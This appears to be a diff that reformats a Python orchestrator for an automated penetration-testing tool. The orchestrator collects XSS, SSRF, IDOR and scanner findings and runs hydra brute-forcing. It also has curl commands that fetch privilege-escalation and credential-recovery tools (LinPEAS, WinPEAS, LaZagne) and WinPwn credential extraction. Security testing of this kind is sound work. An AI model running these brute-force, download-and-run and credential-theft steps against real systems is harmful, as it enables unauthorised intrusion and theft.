-                                type="xss_vulnerability",
-                                value="XSS Vulnerability Detected",
-                                description=f"Cross-site scripting vulnerability at {url}",
-                                severity="high",
-                                phase="exploit",
-                                tool="xsstrike",
-                                target=url,
-                                metadata={"xss_indicators": xss_count}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="xss_vulnerability",
+                                    value="XSS Vulnerability Detected",
+                                    description=f"Cross-site scripting vulnerability at {url}",
+                                    severity="high",
+                                    phase="exploit",
+                                    tool="xsstrike",
+                                    target=url,
+                                    metadata={"xss_indicators": xss_count},
+                                )
+                            )
 
                 # Save combined output
                 if all_xsstrike_output:
-                    (self.output_dir / f"xsstrike_{self.domain}.txt").write_text("\n\n".join(all_xsstrike_output))
+                    (self.output_dir / f"xsstrike_{self.domain}.txt").write_text(
+                        "\n\n".join(all_xsstrike_output)
+                    )
                     tools_run.append("xsstrike")
 
                 self._log_tool(
                     f"xsstrike - tested {tested_count} URLs, {total_xss_count} potential XSS",
-                    "done"
+                    "done",
                 )
 
             # 6. BOLA/IDOR Testing - Broken Object Level Authorization (NEW)
@@ -5345,7 +6136,9 @@ class Orchestrator:
             if bola_findings:
                 findings.extend(bola_findings)
                 tools_run.append("bola-test")
-                self._log_tool(f"bola-test - {len(bola_findings)} IDOR vulnerabilities found!", "done")
+                self._log_tool(
+                    f"bola-test - {len(bola_findings)} IDOR vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("bola-test - no IDOR vulnerabilities detected", "done")
 
@@ -5354,7 +6147,9 @@ class Orchestrator:
             if ssrf_findings:
                 findings.extend(ssrf_findings)
                 tools_run.append("ssrf-test")
-                self._log_tool(f"ssrf-test - {len(ssrf_findings)} SSRF vulnerabilities found!", "done")
+                self._log_tool(
+                    f"ssrf-test - {len(ssrf_findings)} SSRF vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("ssrf-test - no SSRF vulnerabilities detected", "done")
 
@@ -5372,7 +6167,9 @@ class Orchestrator:
             if ssti_findings:
                 findings.extend(ssti_findings)
                 tools_run.append("ssti-test")
-                self._log_tool(f"ssti-test - {len(ssti_findings)} SSTI vulnerabilities found!", "done")
+                self._log_tool(
+                    f"ssti-test - {len(ssti_findings)} SSTI vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("ssti-test - no SSTI vulnerabilities detected", "done")
 
@@ -5382,7 +6179,9 @@ class Orchestrator:
             if hhi_findings:
                 findings.extend(hhi_findings)
                 tools_run.append("host-header-injection")
-                self._log_tool(f"host-header-injection - {len(hhi_findings)} vulnerabilities found!", "done")
+                self._log_tool(
+                    f"host-header-injection - {len(hhi_findings)} vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("host-header-injection - no vulnerabilities detected", "done")
 
@@ -5392,7 +6191,9 @@ class Orchestrator:
             if crlf_findings:
                 findings.extend(crlf_findings)
                 tools_run.append("crlf-injection")
-                self._log_tool(f"crlf-injection - {len(crlf_findings)} vulnerabilities found!", "done")
+                self._log_tool(
+                    f"crlf-injection - {len(crlf_findings)} vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("crlf-injection - no vulnerabilities detected", "done")
 
@@ -5402,7 +6203,9 @@ class Orchestrator:
             if hpp_findings:
                 findings.extend(hpp_findings)
                 tools_run.append("http-param-pollution")
-                self._log_tool(f"http-param-pollution - {len(hpp_findings)} vulnerabilities found!", "done")
+                self._log_tool(
+                    f"http-param-pollution - {len(hpp_findings)} vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("http-param-pollution - no vulnerabilities detected", "done")
 
@@ -5412,7 +6215,9 @@ class Orchestrator:
             if takeover_findings:
                 findings.extend(takeover_findings)
                 tools_run.append("subdomain-takeover")
-                self._log_tool(f"subdomain-takeover - {len(takeover_findings)} vulnerabilities found!", "done")
+                self._log_tool(
+                    f"subdomain-takeover - {len(takeover_findings)} vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("subdomain-takeover - no vulnerabilities detected", "done")
 
@@ -5422,7 +6227,9 @@ class Orchestrator:
             if xxe_findings:
                 findings.extend(xxe_findings)
                 tools_run.append("xxe-injection")
-                self._log_tool(f"xxe-injection - {len(xxe_findings)} vulnerabilities found!", "done")
+                self._log_tool(
+                    f"xxe-injection - {len(xxe_findings)} vulnerabilities found!", "done"
+                )
             else:
                 self._log_tool("xxe-injection - no vulnerabilities detected", "done")
 
@@ -5459,22 +6266,24 @@ class Orchestrator:
                         f"hydra -L {self.config.wordlist_users} -P {self.config.wordlist_passwords} "
                         f"-t {self.config.hydra_threads} -f -o {self.output_dir}/hydra_{service}.txt "
                         f"{self.safe_domain} {service} 2>/dev/null",
-                        timeout=self.config.hydra_timeout
+                        timeout=self.config.hydra_timeout,
                     )
                     if ret == 0:
                         tools_run.append(f"hydra_{service}")
 
                         if "login:" in output.lower() or "password:" in output.lower():
-                            findings.append(Finding(
-                                type="credential_found",
-                                value=f"Weak credentials on {service}",
-                                description=f"Valid credentials found for {service} service",
-                                severity="critical",
-                                phase="exploit",
-                                tool="hydra",
-                                target=f"{self.domain}:{port}",
-                                metadata={"service": service}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="credential_found",
+                                    value=f"Weak credentials on {service}",
+                                    description=f"Valid credentials found for {service} service",
+                                    severity="critical",
+                                    phase="exploit",
+                                    tool="hydra",
+                                    target=f"{self.domain}:{port}",
+                                    metadata={"service": service},
+                                )
+                            )
                             self.config.shell_obtained = True
 
                         self._log_tool(f"hydra ({service}) - completed", "done")
@@ -5507,16 +6316,18 @@ class Orchestrator:
                             exploits = json.loads(output)
                             if exploits.get("RESULTS_EXPLOIT"):
                                 (self.output_dir / f"searchsploit_{term}.json").write_text(output)
-                                findings.append(Finding(
-                                    type="potential_exploit",
-                                    value=f"Exploits found for {term}",
-                                    description=f"Found {len(exploits['RESULTS_EXPLOIT'])} potential exploits for {term}",
-                                    severity="info",
-                                    phase="exploit",
-                                    tool="searchsploit",
-                                    target=self.domain,
-                                    metadata={"exploits": exploits["RESULTS_EXPLOIT"][:5]}
-                                ))
+                                findings.append(
+                                    Finding(
+                                        type="potential_exploit",
+                                        value=f"Exploits found for {term}",
+                                        description=f"Found {len(exploits['RESULTS_EXPLOIT'])} potential exploits for {term}",
+                                        severity="info",
+                                        phase="exploit",
+                                        tool="searchsploit",
+                                        target=self.domain,
+                                        metadata={"exploits": exploits["RESULTS_EXPLOIT"][:5]},
+                                    )
+                                )
                         except json.JSONDecodeError:
                             pass
 
@@ -5537,28 +6348,29 @@ class Orchestrator:
                 vulns = acunetix.get_scan_vulnerabilities(self.scan_ids["acunetix"])
                 vuln_list = []
                 for vuln in vulns:
-                    findings.append(Finding(
-                        type="vulnerability",
-                        value=vuln.name,
-                        description=vuln.description or vuln.name,
-                        severity=vuln.severity,
-                        phase="exploit",
-                        tool="acunetix",
-                        target=vuln.affected_url,
-                        metadata={
-                            "vuln_id": vuln.vuln_id,
-                            "cvss": vuln.cvss_score
-                        }
-                    ))
+                    findings.append(
+                        Finding(
+                            type="vulnerability",
+                            value=vuln.name,
+                            description=vuln.description or vuln.name,
+                            severity=vuln.severity,
+                            phase="exploit",
+                            tool="acunetix",
+                            target=vuln.affected_url,
+                            metadata={"vuln_id": vuln.vuln_id, "cvss": vuln.cvss_score},
+                        )
+                    )
                     # Collect for JSON output
-                    vuln_list.append({
-                        "vuln_id": vuln.vuln_id,
-                        "name": vuln.name,
-                        "severity": vuln.severity,
-                        "description": vuln.description,
-                        "affected_url": vuln.affected_url,
-                        "cvss_score": vuln.cvss_score
-                    })
+                    vuln_list.append(
+                        {
+                            "vuln_id": vuln.vuln_id,
+                            "name": vuln.name,
+                            "severity": vuln.severity,
+                            "description": vuln.description,
+                            "affected_url": vuln.affected_url,
+                            "cvss_score": vuln.cvss_score,
+                        }
+                    )
 
                 # Always update acunetix_scan.json with current results
                 acunetix_json_path = self.output_dir / "acunetix_scan.json"
@@ -5578,7 +6390,9 @@ class Orchestrator:
                 if vulns:
                     self._log_tool(f"Acunetix Results - {len(vulns)} vulnerabilities", "done")
                 else:
-                    self._log_tool(f"Acunetix - {status.status} ({status.progress}%) - no vulns yet", "done")
+                    self._log_tool(
+                        f"Acunetix - {status.status} ({status.progress}%) - no vulns yet", "done"
+                    )
             except Exception as e:
                 errors.append(f"Error fetching Acunetix results: {e}")
 
@@ -5593,28 +6407,36 @@ class Orchestrator:
                 issues = burp.get_scan_issues(self.scan_ids["burp"])
                 issue_list = []
                 for issue in issues:
-                    sev = issue.severity.value if hasattr(issue.severity, 'value') else str(issue.severity)
-                    findings.append(Finding(
-                        type="vulnerability",
-                        value=issue.name,
-                        description=issue.description or issue.name,
-                        severity=sev,
-                        phase="exploit",
-                        tool="burp",
-                        target=issue.url,
-                        metadata={
+                    sev = (
+                        issue.severity.value
+                        if hasattr(issue.severity, "value")
+                        else str(issue.severity)
+                    )
+                    findings.append(
+                        Finding(
+                            type="vulnerability",
+                            value=issue.name,
+                            description=issue.description or issue.name,
+                            severity=sev,
+                            phase="exploit",
+                            tool="burp",
+                            target=issue.url,
+                            metadata={
+                                "issue_id": issue.serial_number,
+                                "confidence": str(issue.confidence),
+                            },
+                        )
+                    )
+                    issue_list.append(
+                        {
                             "issue_id": issue.serial_number,
-                            "confidence": str(issue.confidence)
+                            "name": issue.name,
+                            "severity": sev,
+                            "description": issue.description,
+                            "url": issue.url,
+                            "confidence": str(issue.confidence),
                         }
-                    ))
-                    issue_list.append({
-                        "issue_id": issue.serial_number,
-                        "name": issue.name,
-                        "severity": sev,
-                        "description": issue.description,
-                        "url": issue.url,
-                        "confidence": str(issue.confidence)
-                    })
+                    )
 
                 # Always save burp_scan.json with current results
                 burp_json_path = self.output_dir / "burp_scan.json"
@@ -5634,7 +6456,9 @@ class Orchestrator:
                 if issues:
                     self._log_tool(f"Burp Suite Results - {len(issues)} issues", "done")
                 else:
-                    self._log_tool(f"Burp Suite - {status.status} ({status.progress}%) - no issues yet", "done")
+                    self._log_tool(
+                        f"Burp Suite - {status.status} ({status.progress}%) - no issues yet", "done"
+                    )
             except Exception as e:
                 errors.append(f"Error fetching Burp Suite results: {e}")
 
@@ -5650,30 +6474,34 @@ class Orchestrator:
                 if status.status not in ["unreachable", "error"]:
                     vulns = nessus.get_vulnerabilities(self.scan_ids["nessus"])
                     for vuln in vulns:
-                        findings.append(Finding(
-                            type="vulnerability",
-                            value=vuln.plugin_name,
-                            description=vuln.description or vuln.plugin_name,
-                            severity=vuln.severity_name,
-                            phase="exploit",
-                            tool="nessus",
-                            target=f"{vuln.host}:{vuln.port}",
-                            metadata={
+                        findings.append(
+                            Finding(
+                                type="vulnerability",
+                                value=vuln.plugin_name,
+                                description=vuln.description or vuln.plugin_name,
+                                severity=vuln.severity_name,
+                                phase="exploit",
+                                tool="nessus",
+                                target=f"{vuln.host}:{vuln.port}",
+                                metadata={
+                                    "plugin_id": vuln.plugin_id,
+                                    "cvss": vuln.cvss_score,
+                                    "cve": vuln.cve,
+                                },
+                            )
+                        )
+                        vuln_list.append(
+                            {
                                 "plugin_id": vuln.plugin_id,
-                                "cvss": vuln.cvss_score,
-                                "cve": vuln.cve
+                                "plugin_name": vuln.plugin_name,
+                                "severity": vuln.severity_name,
+                                "description": vuln.description,
+                                "host": vuln.host,
+                                "port": vuln.port,
+                                "cvss_score": vuln.cvss_score,
+                                "cve": vuln.cve,
                             }
-                        ))
-                        vuln_list.append({
-                            "plugin_id": vuln.plugin_id,
-                            "plugin_name": vuln.plugin_name,
-                            "severity": vuln.severity_name,
-                            "description": vuln.description,
-                            "host": vuln.host,
-                            "port": vuln.port,
-                            "cvss_score": vuln.cvss_score,
-                            "cve": vuln.cve
-                        })
+                        )
 
                 # Always save nessus_scan.json with current results
                 nessus_json_path = self.output_dir / "nessus_scan.json"
@@ -5693,7 +6521,9 @@ class Orchestrator:
                 if vuln_list:
                     self._log_tool(f"Nessus Results - {len(vuln_list)} vulnerabilities", "done")
                 else:
-                    self._log_tool(f"Nessus - {status.status} ({status.progress}%) - no vulns yet", "done")
+                    self._log_tool(
+                        f"Nessus - {status.status} ({status.progress}%) - no vulns yet", "done"
+                    )
             except Exception as e:
                 errors.append(f"Error fetching Nessus results: {e}")
 
@@ -5710,31 +6540,35 @@ class Orchestrator:
                 alert_list = []
                 for alert in alerts:
                     sev = severity_map.get(alert.risk, "info")
-                    findings.append(Finding(
-                        type="vulnerability",
-                        value=alert.name,
-                        description=alert.description or alert.name,
-                        severity=sev,
-                        phase="exploit",
-                        tool="zap",
-                        target=alert.url,
-                        metadata={
-                            "alert_id": alert.alert_id,
-                            "cwe_id": alert.cwe_id,
-                            "confidence": alert.confidence_name
-                        }
-                    ))
+                    findings.append(
+                        Finding(
+                            type="vulnerability",
+                            value=alert.name,
+                            description=alert.description or alert.name,
+                            severity=sev,
+                            phase="exploit",
+                            tool="zap",
+                            target=alert.url,
+                            metadata={
+                                "alert_id": alert.alert_id,
+                                "cwe_id": alert.cwe_id,
+                                "confidence": alert.confidence_name,
+                            },
+                        )
+                    )
                     # Collect for JSON output
-                    alert_list.append({
-                        "alert_id": alert.alert_id,
-                        "name": alert.name,
-                        "severity": sev,
-                        "risk": alert.risk,
-                        "description": alert.description,
-                        "url": alert.url,
-                        "cwe_id": alert.cwe_id,
-                        "confidence": alert.confidence_name
-                    })
+                    alert_list.append(
+                        {
+                            "alert_id": alert.alert_id,
+                            "name": alert.name,
+                            "severity": sev,
+                            "risk": alert.risk,
+                            "description": alert.description,
+                            "url": alert.url,
+                            "cwe_id": alert.cwe_id,
+                            "confidence": alert.confidence_name,
+                        }
+                    )
 
                 # Always save zap_scan.json with current results
                 zap_json_path = self.output_dir / "zap_scan.json"
@@ -5771,7 +6605,7 @@ class Orchestrator:
             duration=duration,
             findings=findings,
             tools_run=tools_run,
-            errors=errors
+            errors=errors,
         )
 
         self.phase_results[phase] = result
@@ -5809,13 +6643,14 @@ class Orchestrator:
 
         # Import verification tools
         try:
-            from aipt_v2.validation.ssrf_verifier import SSRFVerifier
+            from aipt_v2.models.findings import Finding as ModelFinding
+            from aipt_v2.models.findings import Severity as ModelSeverity
             from aipt_v2.models.findings import (
-                Finding as ModelFinding,
                 VerificationStatus,
                 VulnerabilityType,
-                Severity as ModelSeverity,
             )
+            from aipt_v2.validation.ssrf_verifier import SSRFVerifier
+
             VERIFICATION_AVAILABLE = True
         except ImportError as e:
             logger.warning(f"Verification modules not available: {e}")
@@ -5833,7 +6668,7 @@ class Orchestrator:
                 findings=[],
                 tools_run=[],
                 errors=["Verification modules not available"],
-                metadata={"reason": "Import error"}
+                metadata={"reason": "Import error"},
             )
             self.phase_results[phase] = result
             return result
@@ -5843,29 +6678,47 @@ class Orchestrator:
         for f in self.findings:
             # Check if this finding is high-severity vulnerability that needs verification
             sev = f.severity
-            if hasattr(sev, 'value'):
+            if hasattr(sev, "value"):
                 sev = sev.value
             sev_str = str(sev).lower()
 
-            if sev_str in ['critical', 'high', 'medium']:
+            if sev_str in ["critical", "high", "medium"]:
                 # Check if it's a verifiable vulnerability type
-                f_type = f.type.lower() if hasattr(f, 'type') and f.type else ''
-                f_desc = f.description.lower() if hasattr(f, 'description') and f.description else ''
-                f_value = str(f.value).lower() if hasattr(f, 'value') and f.value else ''
+                f_type = f.type.lower() if hasattr(f, "type") and f.type else ""
+                f_desc = (
+                    f.description.lower() if hasattr(f, "description") and f.description else ""
+                )
+                f_value = str(f.value).lower() if hasattr(f, "value") and f.value else ""
 
                 # Expanded list of verifiable categories (not just SSRF)
                 verifiable_patterns = [
-                    'ssrf', 'server-side request',  # SSRF
-                    'ssl', 'tls', 'heartbleed', 'poodle', 'beast', 'breach',  # SSL/TLS
-                    'xss', 'cross-site scripting', 'script injection',  # XSS
-                    'cors', 'cross-origin',  # CORS
-                    'header', 'x-frame', 'hsts', 'content-type',  # Security Headers
-                    'injection', 'sqli', 'sql injection',  # Injection
-                    'csrf', 'cross-site request forgery',  # CSRF
-                    'open redirect', 'redirect',  # Open Redirect
+                    "ssrf",
+                    "server-side request",  # SSRF
+                    "ssl",
+                    "tls",
+                    "heartbleed",
+                    "poodle",
+                    "beast",
+                    "breach",  # SSL/TLS
+                    "xss",
+                    "cross-site scripting",
+                    "script injection",  # XSS
+                    "cors",
+                    "cross-origin",  # CORS
+                    "header",
+                    "x-frame",
+                    "hsts",
+                    "content-type",  # Security Headers
+                    "injection",
+                    "sqli",
+                    "sql injection",  # Injection
+                    "csrf",
+                    "cross-site request forgery",  # CSRF
+                    "open redirect",
+                    "redirect",  # Open Redirect
                 ]
 
-                combined_text = f'{f_type} {f_desc} {f_value}'
+                combined_text = f"{f_type} {f_desc} {f_value}"
                 if any(pattern in combined_text for pattern in verifiable_patterns):
                     findings_to_verify.append(f)
 
@@ -5881,9 +6734,7 @@ class Orchestrator:
             try:
                 async with SSRFVerifier() as verifier:
                     async with httpx.AsyncClient(
-                        timeout=30.0,
-                        verify=False,
-                        follow_redirects=True
+                        timeout=30.0, verify=False, follow_redirects=True
                     ) as client:
                         # Convert httpx client to aiohttp-like interface for verifier
                         # Note: SSRFVerifier expects aiohttp, but we can adapt
@@ -5891,11 +6742,23 @@ class Orchestrator:
                             try:
                                 # Create a model Finding for verification
                                 model_finding = ModelFinding(
-                                    title=str(finding.value) if hasattr(finding, 'value') else "SSRF Finding",
+                                    title=(
+                                        str(finding.value)
+                                        if hasattr(finding, "value")
+                                        else "SSRF Finding"
+                                    ),
                                     severity=ModelSeverity.HIGH,
                                     vuln_type=VulnerabilityType.SSRF,
-                                    url=finding.target if hasattr(finding, 'target') else self.target,
-                                    evidence=finding.description if hasattr(finding, 'description') else "",
+                                    url=(
+                                        finding.target
+                                        if hasattr(finding, "target")
+                                        else self.target
+                                    ),
+                                    evidence=(
+                                        finding.description
+                                        if hasattr(finding, "description")
+                                        else ""
+                                    ),
                                     source="verification",
                                 )
 
@@ -5903,27 +6766,27 @@ class Orchestrator:
                                 result = verifier._analyze_content(model_finding)
 
                                 # Update the original finding's metadata
-                                if not hasattr(finding, 'metadata') or finding.metadata is None:
+                                if not hasattr(finding, "metadata") or finding.metadata is None:
                                     finding.metadata = {}
 
-                                finding.metadata['verification_status'] = result.status.value
-                                finding.metadata['verification_confidence'] = result.confidence
-                                finding.metadata['verification_evidence'] = result.evidence
+                                finding.metadata["verification_status"] = result.status.value
+                                finding.metadata["verification_confidence"] = result.confidence
+                                finding.metadata["verification_evidence"] = result.evidence
 
                                 if result.status == VerificationStatus.CONFIRMED:
                                     verified_count += 1
-                                    finding.metadata['verified'] = True
+                                    finding.metadata["verified"] = True
                                 elif result.status == VerificationStatus.FALSE_POSITIVE:
                                     false_positive_count += 1
-                                    finding.metadata['false_positive'] = True
+                                    finding.metadata["false_positive"] = True
                                 else:
                                     manual_review_count += 1
-                                    finding.metadata['needs_manual_review'] = True
+                                    finding.metadata["needs_manual_review"] = True
 
                             except Exception as e:
                                 logger.debug(f"Error verifying finding: {e}")
-                                if hasattr(finding, 'metadata') and finding.metadata is not None:
-                                    finding.metadata['verification_error'] = str(e)
+                                if hasattr(finding, "metadata") and finding.metadata is not None:
+                                    finding.metadata["verification_error"] = str(e)
                                 manual_review_count += 1
 
                 tools_run.append("ssrf_verifier")
@@ -5935,27 +6798,29 @@ class Orchestrator:
         self._log_tool(
             f"Verification complete: {verified_count} confirmed, "
             f"{false_positive_count} false positives, {manual_review_count} need review",
-            "done"
+            "done",
         )
 
         # Create verification summary finding
-        findings.append(Finding(
-            type="verification_summary",
-            value=f"Verification Phase Complete",
-            description=f"Verified {len(findings_to_verify)} findings: "
-                       f"{verified_count} confirmed, {false_positive_count} false positives, "
-                       f"{manual_review_count} pending manual review",
-            severity="info",
-            phase="verify",
-            tool="verification_engine",
-            target=self.target,
-            metadata={
-                "total_verified": len(findings_to_verify),
-                "confirmed": verified_count,
-                "false_positives": false_positive_count,
-                "manual_review": manual_review_count,
-            }
-        ))
+        findings.append(
+            Finding(
+                type="verification_summary",
+                value="Verification Phase Complete",
+                description=f"Verified {len(findings_to_verify)} findings: "
+                f"{verified_count} confirmed, {false_positive_count} false positives, "
+                f"{manual_review_count} pending manual review",
+                severity="info",
+                phase="verify",
+                tool="verification_engine",
+                target=self.target,
+                metadata={
+                    "total_verified": len(findings_to_verify),
+                    "confirmed": verified_count,
+                    "false_positives": false_positive_count,
+                    "manual_review": manual_review_count,
+                },
+            )
+        )
 
         duration = time.time() - start_time
 
@@ -5973,7 +6838,7 @@ class Orchestrator:
                 "confirmed": verified_count,
                 "false_positives": false_positive_count,
                 "manual_review": manual_review_count,
-            }
+            },
         )
 
         self.phase_results[phase] = result
@@ -6018,7 +6883,7 @@ class Orchestrator:
                 findings=[],
                 tools_run=[],
                 errors=[],
-                metadata={"reason": "No shell access obtained during exploitation"}
+                metadata={"reason": "No shell access obtained during exploitation"},
             )
             self.phase_results[phase] = result
             return result
@@ -6036,42 +6901,46 @@ class Orchestrator:
                 # Note: In real scenario, this would be uploaded and executed on target
                 # For now, we simulate the check
                 ret, output = await self._run_command(
-                    f"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && echo 'Downloaded'",
-                    timeout=60
+                    "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && echo 'Downloaded'",
+                    timeout=60,
                 )
                 if ret == 0 and "Downloaded" in output:
                     tools_run.append("linpeas")
-                    findings.append(Finding(
-                        type="post_exploit_tool",
-                        value="LinPEAS ready",
-                        description="LinPEAS privilege escalation script downloaded and ready for execution on target",
-                        severity="info",
-                        phase="post_exploit",
-                        tool="linpeas",
-                        target=self.domain,
-                        metadata={"script_path": "/tmp/linpeas.sh"}
-                    ))
+                    findings.append(
+                        Finding(
+                            type="post_exploit_tool",
+                            value="LinPEAS ready",
+                            description="LinPEAS privilege escalation script downloaded and ready for execution on target",
+                            severity="info",
+                            phase="post_exploit",
+                            tool="linpeas",
+                            target=self.domain,
+                            metadata={"script_path": "/tmp/linpeas.sh"},
+                        )
+                    )
                     self._log_tool("linpeas - downloaded", "done")
 
             # 2. pspy - Process Monitoring
             if "pspy" in self.config.post_exploit_tools:
                 self._log_tool("pspy", "running")
                 ret, output = await self._run_command(
-                    f"curl -sL https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /tmp/pspy64 2>/dev/null && chmod +x /tmp/pspy64 && echo 'Downloaded'",
-                    timeout=60
+                    "curl -sL https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /tmp/pspy64 2>/dev/null && chmod +x /tmp/pspy64 && echo 'Downloaded'",
+                    timeout=60,
                 )
                 if ret == 0 and "Downloaded" in output:
                     tools_run.append("pspy")
-                    findings.append(Finding(
-                        type="post_exploit_tool",
-                        value="pspy ready",
-                        description="pspy process monitor downloaded for cron job and process analysis",
-                        severity="info",
-                        phase="post_exploit",
-                        tool="pspy",
-                        target=self.domain,
-                        metadata={"binary_path": "/tmp/pspy64"}
-                    ))
+                    findings.append(
+                        Finding(
+                            type="post_exploit_tool",
+                            value="pspy ready",
+                            description="pspy process monitor downloaded for cron job and process analysis",
+                            severity="info",
+                            phase="post_exploit",
+                            tool="pspy",
+                            target=self.domain,
+                            metadata={"binary_path": "/tmp/pspy64"},
+                        )
+                    )
                     self._log_tool("pspy - downloaded", "done")
 
         # ==================== WINDOWS POST-EXPLOITATION ====================
@@ -6081,49 +6950,53 @@ class Orchestrator:
             if "winpeas" in self.config.post_exploit_tools:
                 self._log_tool("winpeas", "running")
                 ret, output = await self._run_command(
-                    f"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o /tmp/winpeas.exe 2>/dev/null && echo 'Downloaded'",
-                    timeout=60
+                    "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o /tmp/winpeas.exe 2>/dev/null && echo 'Downloaded'",
+                    timeout=60,
                 )
                 if ret == 0 and "Downloaded" in output:
                     tools_run.append("winpeas")
-                    findings.append(Finding(
-                        type="post_exploit_tool",
-                        value="WinPEAS ready",
-                        description="WinPEAS privilege escalation tool downloaded for Windows target",
-                        severity="info",
-                        phase="post_exploit",
-                        tool="winpeas",
-                        target=self.domain,
-                        metadata={"binary_path": "/tmp/winpeas.exe"}
-                    ))
+                    findings.append(
+                        Finding(
+                            type="post_exploit_tool",
+                            value="WinPEAS ready",
+                            description="WinPEAS privilege escalation tool downloaded for Windows target",
+                            severity="info",
+                            phase="post_exploit",
+                            tool="winpeas",
+                            target=self.domain,
+                            metadata={"binary_path": "/tmp/winpeas.exe"},
+                        )
+                    )
                     self._log_tool("winpeas - downloaded", "done")
 
             # 2. LaZagne - Credential Recovery
             if "lazagne" in self.config.post_exploit_tools:
                 self._log_tool("lazagne", "running")
                 ret, output = await self._run_command(
-                    f"curl -sL https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -o /tmp/lazagne.exe 2>/dev/null && echo 'Downloaded'",
-                    timeout=60
+                    "curl -sL https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -o /tmp/lazagne.exe 2>/dev/null && echo 'Downloaded'",
+                    timeout=60,
                 )
                 if ret == 0 and "Downloaded" in output:
                     tools_run.append("lazagne")
-                    findings.append(Finding(
-                        type="post_exploit_tool",
-                        value="LaZagne ready",
-                        description="LaZagne credential recovery tool downloaded for Windows target",
-                        severity="info",
-                        phase="post_exploit",
-                        tool="lazagne",
-                        target=self.domain,
-                        metadata={"binary_path": "/tmp/lazagne.exe"}
-                    ))
+                    findings.append(
+                        Finding(
+                            type="post_exploit_tool",
+                            value="LaZagne ready",
+                            description="LaZagne credential recovery tool downloaded for Windows target",
+                            severity="info",
+                            phase="post_exploit",
+                            tool="lazagne",
+                            target=self.domain,
+                            metadata={"binary_path": "/tmp/lazagne.exe"},
+                        )
+                    )
                     self._log_tool("lazagne - downloaded", "done")
 
             # 3. WinPwn - Comprehensive Windows/AD Assessment
             if "winpwn" in self.config.post_exploit_tools:
                 self._log_tool("winpwn", "running")
                 try:
-                    from aipt_v2.scanners.winpwn_scanner import WinPwnScanner, WinPwnScanConfig
+                    from aipt_v2.scanners.winpwn_scanner import WinPwnScanConfig, WinPwnScanner
 
                     winpwn_config = WinPwnScanConfig(
                         target_host=self.domain,
@@ -6143,33 +7016,42 @@ class Orchestrator:
 
                     # Convert WinPwn findings to orchestrator findings
                     for wp_finding in result.findings:
-                        findings.append(Finding(
-                            type="post_exploit_privesc",
-                            value=wp_finding.title,
-                            description=wp_finding.description,
-                            severity=wp_finding.severity.value,
-                            phase="post_exploit",
-                            tool="winpwn",
-                            target=self.domain,
-                            metadata={
-                                "module": wp_finding.template,
-                                "evidence": wp_finding.evidence[:200] if wp_finding.evidence else ""
-                            }
-                        ))
+                        findings.append(
+                            Finding(
+                                type="post_exploit_privesc",
+                                value=wp_finding.title,
+                                description=wp_finding.description,
+                                severity=wp_finding.severity.value,
+                                phase="post_exploit",
+                                tool="winpwn",
+                                target=self.domain,
+                                metadata={
+                                    "module": wp_finding.template,
+                                    "evidence": (
+                                        wp_finding.evidence[:200] if wp_finding.evidence else ""
+                                    ),
+                                },
+                            )
+                        )
 
                     if result.credentials_found > 0:
-                        findings.append(Finding(
-                            type="credentials",
-                            value=f"WinPwn extracted {result.credentials_found} credentials",
-                            description="Credentials were extracted from the Windows target",
-                            severity="critical",
-                            phase="post_exploit",
-                            tool="winpwn",
-                            target=self.domain,
-                            metadata={"count": result.credentials_found}
-                        ))
+                        findings.append(
+                            Finding(
+                                type="credentials",
+                                value=f"WinPwn extracted {result.credentials_found} credentials",
+                                description="Credentials were extracted from the Windows target",
+                                severity="critical",
+                                phase="post_exploit",
+                                tool="winpwn",
+                                target=self.domain,
+                                metadata={"count": result.credentials_found},
+                            )
+                        )
 
-                    self._log_tool(f"winpwn - {len(result.findings)} findings, {result.credentials_found} creds", "done")
+                    self._log_tool(
+                        f"winpwn - {len(result.findings)} findings, {result.credentials_found} creds",
+                        "done",
+                    )
 
                 except ImportError:
                     errors.append("WinPwn module not available")
@@ -6190,10 +7072,12 @@ class Orchestrator:
                 "Use LaZagne to recover stored credentials",
                 "Run WinPwn for comprehensive Windows/AD assessment",
                 "Check for kernel exploits based on version",
-                "Look for SUID binaries (Linux) or service misconfigurations (Windows)"
-            ]
+                "Look for SUID binaries (Linux) or service misconfigurations (Windows)",
+            ],
         }
-        (self.output_dir / "post_exploit_report.json").write_text(json.dumps(post_exploit_report, indent=2), encoding="utf-8")
+        (self.output_dir / "post_exploit_report.json").write_text(
+            json.dumps(post_exploit_report, indent=2), encoding="utf-8"
+        )
 
         # Add findings to global list
         for f in findings:
@@ -6209,10 +7093,7 @@ class Orchestrator:
             findings=findings,
             tools_run=tools_run,
             errors=errors,
-            metadata={
-                "target_os": target_os,
-                "shell_obtained": self.config.shell_obtained
-            }
+            metadata={"target_os": target_os, "shell_obtained": self.config.shell_obtained},
         )
 
         self.phase_results[phase] = result
@@ -6237,16 +7118,16 @@ class Orchestrator:
             return {"status": "no_scanners", "message": "No enterprise scanners were started"}
 
         width = self._get_terminal_width() - 4
-        print("\n" + "="*width)
+        print("\n" + "=" * width)
         print("  📊 COLLECTING ENTERPRISE SCANNER RESULTS")
-        print("="*width)
+        print("=" * width)
 
         results_summary = {
             "scanners_polled": list(self.scan_ids.keys()),
             "completed": [],
             "still_running": [],
             "failed": [],
-            "total_findings_added": 0
+            "total_findings_added": 0,
         }
 
         findings_added = []
@@ -6294,24 +7175,28 @@ class Orchestrator:
                         phase="scan",
                         tool="acunetix",
                         target=vuln.affected_url,
-                        metadata={"vuln_id": vuln.vuln_id, "cvss": vuln.cvss_score}
